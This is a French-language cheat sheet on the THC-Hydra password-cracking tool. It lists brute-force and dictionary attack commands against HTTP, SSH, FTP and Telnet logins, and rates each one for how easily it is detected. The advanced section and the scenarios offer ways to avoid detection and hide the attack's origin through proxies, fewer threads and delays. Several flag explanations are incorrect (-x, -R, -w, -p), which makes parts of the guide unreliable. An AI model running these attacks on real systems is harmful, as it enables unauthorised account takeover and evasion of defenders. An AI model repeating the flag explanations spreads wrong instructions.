# 😁 HYDRA

#### Introduction

Hydra (ou THC-Hydra) est un outil open-source utilisé pour effectuer des attaques par force brute sur divers protocoles de connexion. Il est capable de tester des millions de combinaisons de mots de passe pour trouver les informations d'authentification correctes.

#### Installation de Hydra

**Sous Debian/Ubuntu**

```bash
sudo apt update
sudo apt install hydra
```

**Sous Windows**

1. **Télécharger Hydra pour Windows** depuis le [site de THC](https://github.com/vanhauser-thc/thc-hydra).
2. **Décompresser le fichier téléchargé** et utiliser les binaires fournis.

#### Commandes de Base

1.  **Lancer une attaque par dictionnaire sur un service HTTP**

    ```bash
    hydra -l <username> -P <password_file> <target> http-get /login
    ```

    * **Explication** : `-l` spécifie un nom d'utilisateur, `-P` indique le fichier contenant les mots de passe, `<target>` est l'adresse IP ou le domaine, et `http-get /login` précise le chemin d'URL où se trouve le formulaire de connexion.
    * **Discrétion** : Faible à moyenne. Les tentatives de connexion peuvent être détectées par des systèmes de surveillance ou des IDS.
2.  **Lancer une attaque par dictionnaire sur un service SSH**

    ```bash
    hydra -l <username> -P <password_file> ssh://<target>
    ```

    * **Explication** : `ssh://<target>` indique que l'attaque cible un service SSH.
    * **Discrétion** : Faible. Les tentatives de connexion SSH peuvent générer des alertes.
3.  **Lancer une attaque par dictionnaire sur un service FTP**

    ```bash
    hydra -l <username> -P <password_file> ftp://<target>
    ```

    * **Explication** : `ftp://<target>` indique que l'attaque cible un service FTP.
    * **Discrétion** : Faible. Les services FTP peuvent détecter les tentatives de connexion répétées.
4.  **Lancer une attaque par dictionnaire avec une liste de noms d'utilisateur**

    ```bash
    hydra -L <user_file> -P <password_file> <target> ssh
    ```

    * **Explication** : `-L` spécifie un fichier contenant plusieurs noms d'utilisateur, tandis que `-P` est le fichier de mots de passe.
    * **Discrétion** : Faible. Les tentatives avec plusieurs noms d'utilisateur peuvent générer plus de trafic réseau.
5.  **Attaque par force brute avec un protocole spécifique (ex: telnet)**

    ```bash
    hydra -L <user_file> -P <password_file> telnet://<target>
    ```

    * **Explication** : Cible un service Telnet avec une liste d'utilisateurs et de mots de passe.
    * **Discrétion** : Faible. Telnet est souvent surveillé pour des tentatives de connexion suspectes.

#### Options Avancées

1.  **Définir un nombre limité de tentatives**

    ```bash
    hydra -l <username> -P <password_file> -t 4 <target> ssh
    ```

    * **Explication** : `-t` définit le nombre de threads simultanés pour les tentatives de connexion. Par exemple, `-t 4` lance quatre threads en parallèle.
    * **Discrétion** : Moyenne à élevée. Moins de threads peuvent réduire le risque d'être détecté par les systèmes de surveillance.
2.  **Utiliser un proxy pour masquer l'origine**

    ```bash
    hydra -l <username> -P <password_file> -e ns <target> ssh -s 22 -x <proxy>
    ```

    * **Explication** : `-x` permet d'utiliser un proxy pour masquer l'origine des requêtes.
    * **Discrétion** : Haute. L'utilisation d'un proxy peut rendre l'attaque plus difficile à tracer jusqu'à son origine.
3.  **Limiter le nombre de tentatives par IP**

    ```bash
    hydra -l <username> -P <password_file> -R -e ns <target> ssh
    ```

    * **Explication** : `-R` active la limitation du nombre de tentatives pour éviter d'être bloqué par des mécanismes de défense.
    * **Discrétion** : Moyenne à élevée. Limite le nombre de tentatives pour réduire la détection.
4.  **Ajouter des délais entre les tentatives**

    ```bash
    hydra -l <username> -P <password_file> -w 5 <target> ssh
    ```

    * **Explication** : `-w` définit le délai en secondes entre chaque tentative pour éviter de générer une charge excessive et attirer l'attention.
    * **Discrétion** : Haute. Les délais réduisent le nombre de requêtes envoyées en un temps donné.
5.  **Utiliser une liste de mots de passe alternatifs**

    ```bash
    hydra -l <username> -P <password_file> -p <password> <target> ssh
    ```

    * **Explication** : `-p` permet d'ajouter un mot de passe spécifique en plus de ceux de la liste.
    * **Discrétion** : Moyenne à haute. Tester des mots de passe spécifiques peut augmenter les chances de succès tout en maintenant une discrétion accrue.

#### Exemples de Scénarios

1.  **Attaque sur un service HTTP avec un dictionnaire de mots de passe**

    ```bash
    hydra -l admin -P /path/to/passwords.txt http-get://192.168.1.10/login
    ```

    * **Explication** : Teste les mots de passe dans `/path/to/passwords.txt` pour l'utilisateur `admin` sur le service HTTP à l'adresse `192.168.1.10`.
    * **Discrétion** : Faible. Les attaques HTTP peuvent être détectées par les systèmes de journalisation des serveurs web.
2.  **Attaque sur un service FTP avec des utilisateurs et des mots de passe**

    ```bash
    hydra -L /path/to/users.txt -P /path/to/passwords.txt ftp://192.168.1.10
    ```

    * **Explication** : Teste toutes les combinaisons d'utilisateurs et de mots de passe pour un service FTP à l'adresse `192.168.1.10`.
    * **Discrétion** : Faible. Les services FTP sont souvent configurés pour détecter les tentatives de connexion brutales.
3.  **Attaque SSH avec un proxy pour masquer l'origine**

    ```bash
    hydra -l admin -P /path/to/passwords.txt -e ns -x socks5://proxyserver:1080 ssh://192.168.1.10
    ```

    * **Explication** : Utilise un proxy SOCKS5 pour masquer l'origine des tentatives de connexion SSH.
    * **Discrétion** : Haute. L'utilisation d'un proxy ajoute une couche de dissimulation.
4.  **Attaque par dictionnaire avec un délai entre les tentatives**

    ```bash
    hydra -l admin -P /path/to/passwords.txt -w 10 -e ns ssh://192.168.1.10
    ```

    * **Explication** : Ajoute un délai de 10 secondes entre chaque tentative de connexion pour réduire la détection.
    * **Discrétion** : Haute. Les délais peuvent éviter de déclencher des alarmes pour des tentatives de connexion rapide.



